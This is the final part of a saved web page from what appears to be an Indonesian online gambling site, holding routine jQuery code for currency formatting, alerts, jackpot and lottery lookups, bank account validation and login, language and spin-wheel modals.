                "/authViaIdp",
                params ,
                "json",
                showLoadingImgFn   ,
                 removeLoadingImgFn    ,
            ).done(function(d){
    
             window.onLoginCallback(d,true);

            });
        }
    

         window.currencyCode='IDR';
         window.lang="id";
         window.agentCode='MERCUSUAR77';
         window.sweetAlert= function ( msg , type , title  ,showCancelBtn   ) {
            //check CF error
            var dateNow = "2026-02-25 08:25:39";

            if (msg.indexOf('cloudflare') >= 0) {
                msg = transMsgs.cfTimeout + ' (error time: ' + dateNow + ')';
                title = " ";
            }
            if (msg.indexOf('challenge') >= 0) {
                msg = transMsgs.cfChallenge + ' (error time: ' + dateNow + ')';
                title = " ";
            }
             return     Swal.fire({
                    title: !title? "Warning" : title,
                    text: msg,
                    icon: !type? "error":type,
                    showCancelButton :(showCancelBtn ? true:false),
                    cancelButtonText : "Cancel",
                    showConfirmButton : true, 
                    confirmButtonText : 'OK', 
                } );
            }
            console.log('window.name ' + window.name );
            window.name = !window.name? "parent"  + Date.now() + Math.floor(Math.random() * 100000000) : window.name;
            console.log('window.name ' + window.name );
           window.formatNumber = function (n)   {
                // format number 1000000 to 1,234,567
                return n.replace(/[^0-9\-]/g, "").replace(/\B(?=(\d{3})+(?!\d))/g, ",")
            }
            window.convertToNumber= function (value) {

                    if (!value) {
                        return 0;
                    }
                    if(value.indexOf(".") >= 0){
                        var decimal_pos = value.indexOf(".");
                        value= value.substring(0, decimal_pos);

                    }
                    var number =value.replace(/[^0-9.-]+/g, "");
                    if (isNaN(number)) {
                        number = 0;
                    }
                return number;
           }

            window.formatCurrency = function (value) {
                    const symbol = "";//"$"
                    // get input value
                    var input_val = value;

                    if (typeof value !== 'string') {
                        var input_val = value.toString();
                    }
                    if (input_val === "") { return; }

                    var original_len = input_val.length;


                    if (input_val.indexOf(".") >= 0) {

                        var decimal_pos = input_val.indexOf(".");
                        var left_side = input_val.substring(0, decimal_pos);
                        var right_side = input_val.substring(decimal_pos+1);

                        left_side = formatNumber(left_side);

                        right_side += "00";

                        right_side = right_side.substring(0, 2);

                        input_val = symbol + left_side + "." + right_side;

                    } else {
                        input_val = formatNumber(input_val);
                        input_val = symbol + input_val + ".00";;

                    }

                    return input_val;
           }

                window.prize = 0 ;
                window.ajax_jackpot= function  () {
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getPokerJackpotAmt",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (data) {
                            prize = (data / 2000.000)*2000.000;
                            $('.jackpot_numbers_home').html(`IDR <span id="jackpot_amount">${ commaSeparateNumber(prize) }</span>`)

                            //$('.jackpot_numbers_home').html(`IDR ` + commaSeparateNumber(data.prize));
                        }
                    });
                }
                window.getHkbLotteryResults= function  (callback) {
                    var results = [];
                    $.ajax({
                        url: "https://merdekaMERCUSUAR77.site/getHKBLotteryResults",
                        type: 'post',
                        data: { _token : $('meta[name=csrf-token]').attr('content') },
                        success: function (result) {
                            results =  result.data.hkb_lottery_results;
                            if (typeof callback === 'function') {
                                callback(results);
                            }
                        }
                    });
                   
                }

                var newI = 0;
                window.popitup = function  (url,gameid) {
                  //alert(gameid);
                    newwindow = window.open(url,  window.agentCode + '_gameWindow'+gameid+newI,'toolbar=0,width=1200,height=750');
                    newI++;
                    if (window.focus) { newwindow.focus() }
                    return false;
                }

                window.popup = function (mylink, windowname) {
                    if (!window.focus) return true;
                    var href;
                    if (typeof (mylink) == 'string')
                        href = mylink;
                    else
                        href = mylink.href;
                    window.open(href, windowname, 'width=600,height=800,scrollbars=yes');
                    return false;
                }
                window.commaSeparateNumber = function (val, isJP) {
                    while (/(\d+)(\d{3})/.test(val.toString())) {

                        if( window.currencyCode=='VND' && isJP){
                            val = val.toFixed(0);
                        }else {
                            val = Number(val).toFixed(2);
                        }
                        val = val.toString().replace(/(\d)(?=(\d\d\d)+(?!\d))/g, "$1,");
                    }
                    return val;
                }

                window.getRandomIntInclusive =  function (min, max) {
                    min = Math.ceil(min);
                    max = Math.floor(max);
                    return Math.floor(Math.random() * (max - min + 1)) + min; //The maximum is inclusive and the minimum is inclusive
                }

                /*bank acc min and maxlength limitation */
                window.accLength = parseInt("8");
                    window.bankAccLength =function(selectedBank, default_minlength, default_maxlength){
                        console.log(selectedBank, default_minlength, default_maxlength);
                        var   custom_minLength, custom_maxLength;
                if(selectedBank == 'MDR' || selectedBank == 'MDRLV'){
                    custom_minLength = 13;
                    custom_maxLength = 13;
                }
                else if(selectedBank == 'BNI' || selectedBank == 'BCA' || selectedBank == 'BSI' || selectedBank == 'BLA'){
                    custom_minLength = 10;
                    custom_maxLength = 10;
                } 
                else if(selectedBank == 'BRI'){
                    custom_minLength = 15;
                    custom_maxLength = 15;
                } 
                else if(selectedBank == 'DMN'){
                    custom_minLength = 10;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'BPDSULTENG'){
                    custom_minLength = 10;
                    custom_maxLength = 15;
                }
                else if(selectedBank == 'ALADIN' || selectedBank == 'ALLO'){
                    custom_minLength = 10;
                    custom_maxLength = 13;
                } 
                else if(selectedBank == 'JAGO' || selectedBank == 'ARIN'){
                    custom_minLength = 8;
                    custom_maxLength = 12;
                } 
                else if(selectedBank == 'CIMBN' || selectedBank == 'SEABANK'){
                    custom_minLength = 12;
                    custom_maxLength = 12;
                }  
                else{
                    custom_minLength  = default_minlength;
                    custom_maxLength  = default_maxlength; 
                }   
                
                return {'min_len': custom_minLength,'max_len': custom_maxLength}
                    }
                /*bank acc min and maxlength limitation end*/ 


  $(document).ready(function () {
                    //suspend-alert
                   // login-alert
                   // promo-disabled-alert
                   // "maintenance-alert";
                   // "comingsoon-alert";
                window.alertLogin=function(e){
                    e.preventDefault();
                    sweetAlert( transMsgs.plsLogin  );
                    return false;
                }

                $(".suspend-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.blockedFrGame);
                        return false;
                });

                $(".login-alert").click(function (e) {
                    if($("#login-modal--layout").length && !$('#loginForm').hasClass('js-inline-form') ){
                         $("#login-modal--layout").nifty("show")
                    }
                    else {
                        alertLogin(e);
                    }

                    return false;
                });

                $(".maintenance-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameMaintenance);
                        return false;
                });

                $(".comingsoon-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert( transMsgs.gameComingSoon);
                        return false;
                });

                $(".promo-disabled-alert").click(function (e) {
                        e.preventDefault();
                        sweetAlert(transMsgs.gamePromoBlock);
                        return false;
                });


               
                $("#login-modal--layout").on('shown.nifty.modal', function(){
                    window.loadOrRefreshTurnstileWidget('loginTurnstileWidget' ); 
                });
 
        });


        $("input").focus(function() {
          $("body").addClass("input-focused");
        });
        $("input").focusout(function() {
          $("body").removeClass("input-focused");
        });

        // popup banner
        var isLoggedIn = window.isAuth;
        var isClosedPopUp = isLoggedIn ? sessionStorage.getItem('isClosedPopUpAftLogin') : sessionStorage.getItem('isClosedPopUp');
        
        if(!isClosedPopUp){
                    }
</script>


<script defer="" type="text/javascript" src="/assets/js/firebase10d9.js"> </script>


 
  <div class="reward-program-popup"></div>
<div class="claimed-reward-popup"></div>
<div class="redeem-ticket-popup"></div>

<!-- spin-wheel modal -->
<div class="modal-wrapper nifty-modal fade-in-scale" id="spin-wheel-modal--layout" data-isnotcloseoverlay="true">
	<div class="md-content"> 
		<div class="md-body"> 
		<div class="modal-header text-center headerModal">
			<button class="btn btn-link closeBtn" id="btn-close--spin-wheel-modal"> X </button>
			</div>
			<div class="flex spinWheelWrapper text-center">
            <!-- spin-wheel type -->
            <input type="hidden" id="spin_wheel_type" value="">

              <div class="spinWheelTitle">Spin Wheel</div>
              <div>untuk mendapatkan koin atau lainnya</div>
              
              <div class="spinWheel">
                <div class=" inline-flex" style="position: relative;">
                  <canvas id="wheelCanvas" width="280" height="280"></canvas>
                  <div class="spinWheelArrow"></div>
                </div>
              </div>
            </div>
			<div class="flex" style=" place-content: center; ">
                <button class="btn btn-block btn-primary " id="spinBtn">
				 Coba Keberuntungan Anda                </button>
            </div>
        </div>
	</div>
</div>
<div class="md-overlay"></div>
<!-- end of spin-wheel modal -->
  <script type="text/javascript" src="/assets/js/ugsports/app_mobile.js"> </script>
  <!--License TNC Modal -->
<!--License TNC Modal -->

<!--Language Option Modal -->
<div class="nifty-modal slide-in-bottom " id="langModal-mobile">
  <div class="md-content">
    <div class="md-body">
      <div class="wrap language">
        <div class="title">Wilayah dan bahasa</div>
        <table class="table-borderless"> 
        
          <tbody><tr>
            <td class="country">Indonesia</td>
            <td></td>
            <td></td>
          </tr>
          <tr>
            <td class="flag-wrap">
              <div class="circle-id"></div>
            </td>
                        <td class="i  ">
            <a href="#" onclick="changeLang(&quot;id&quot;)"> indonesian</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;en&quot;)"> English</a>
            </td>

                        <td class="i b-line ">
            <a href="#" onclick="changeLang(&quot;cn&quot;)"> Mandarin</a>
            </td>

                      </tr> 
     
        </tbody></table>
      </div>
    </div>
  </div>
</div>
<div class="md-overlay"></div>
<!--END Language Option Modal -->
 
<script>
$(document).ready(function () {
  });
 function changeLang(key){
      change_lang(key)
  }
  $('.btn-refresh-captcha').on( 'click', function(e){
e.preventDefault();
e.stopPropagation(); 
var $captchaImg = $(this).parent().find('img');
var curCapUrl = $captchaImg .attr("data-url");
var url = curCapUrl + Date.now() + Math.floor(Math.random() * 100000000);
$captchaImg.attr("src",url);

});



</script>





  

  <script type="text/javascript">
    $(document).ready(function(){
      if( window.location.href.indexOf('reLogin=yes') >= 0  &&  !window.isAuth){
        $("#btnToggleRSideNav").trigger('click');
      }
    });
  </script>

  <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;733979b9c24043199561a4eac8bf2940&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>




<veepn-lock-screen><style>@font-face{font-family:FigtreeVF;src:url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2 supports variations"),url(chrome-extension://majdfhpaihoncoakbjgbdhglocklcgno/fonts/FigtreeVF.woff2) format("woff2-variations");font-weight:100 1000;font-display:swap}</style></veepn-lock-screen><iframe ng-non-bindable="" frameborder="0" hspace="0" marginheight="0" marginwidth="0" scrolling="no" tabindex="-1" vspace="0" width="100%" aria-hidden="true" id="I0_1771979141472" name="I0_1771979141472" src="https://api-kixplay-live1.firebaseapp.com/__/auth/iframe?apiKey=AIzaSyA6hCmsU1Tx-_rB9st6TiXLT_M3D-qQ9aw&amp;appName=%5BDEFAULT%5D&amp;v=11.3.0&amp;eid=p&amp;usegapi=1&amp;jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.lb.id.8ECc3i-niIA.O%2Fd%3D1%2Frs%3DAHpOoo8g466w4vfctJFQ7iHLN0dzTSqREg%2Fm%3D__features__#id=I0_1771979141472&amp;_gfid=I0_1771979141472&amp;parent=https%3A%2F%2FmerdekaMERCUSUAR77.site&amp;pfname=&amp;rpctoken=39952833" style="position: absolute; top: -100px; width: 1px; height: 1px;"></iframe></body></html>